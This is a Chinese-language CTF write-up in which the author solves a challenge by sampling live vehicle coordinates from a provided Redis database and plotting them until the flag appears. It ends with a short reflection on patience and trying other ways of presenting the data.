为了解决第二关，我们重新梳理下题目的情景。我们所连接的Redis数据库存储城市中自动驾驶车辆的实时位置的数据库，数据在实时更新，需要我们对数据进行分析。接着，在连接数据库后我们使用info命令对该题目的出题方式进行分析。我们可以看到实时的连接数，猜想后端只有一个共用的Redis，将其6379号端口映射到不同的端口供选手连接。所以我们应该是需要对数据库中的数据进行分析并找出flag。

![39](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/-JkxAyrzD7W_brYtyyRvHA.png)

通过简单的分析可以发现，该数据库中一共有存储着1000个车辆的实时位置信息。数据库中的每个Key即车辆信息通过Json形式的数据结构保存，包括了其车牌号、经、纬度坐标。因为车辆的坐标是实时更新的，所以最直接的想法是将一段时间每个车的轨迹先画出来，看看有没有什么蛛丝马迹可循。

连接数据库并间隔一定时间保存每个车辆的的位置，最后绘制多点的轨迹图，我们可以发现一串类似于flag的车辆轨迹如下所示。

![40](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (15).png)

接着，为了看得更清楚，我通过点的移动距离可以筛选出构成flag的点，并且调小了时间间隔。同时由于该图是由车的轨迹构成，所以我自然而然想绘制动态图片来搞清楚此flag是如何绘制的，这可能有助于我猜测各个位置的字母和数字是什么。所以，我得到了如下的gif图片，我们可以隐约地看到flag，但是很多位置并不明确，只能靠猜。

![41](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gif.gif)

但是还是不明确，经过meishijia的提醒下，我把横纵坐标的比例调成了一致使得每个字母更加协调。此时可以猜测出大部分的字符，但是有些位置还是无法确定。

![42](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image (14).png)

最后在meishijia的点拨下，我把轨迹图更换成了散点图，这样产生噪音的一些线条就被去除，最终得到了Flag。

![43](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/XVRgPPl5ovYE2NUpVH9zDQ.jpeg)     

此题留给我的经验是：做题时不能急功近利，要多思考，小心尝试。在得到倒数第二张图时，我觉得答案已经呼之欲出，所以一直在猜测每个位置的字符，并尝试爆破。这其实花费了不少时间，最终也没有得到正确的Flag.但是如果能观察图片的构成，思考别的呈现方式，去除连线轨迹产生的噪音，将折线图改为散点图，其实答案就自然而然地呈现啦。
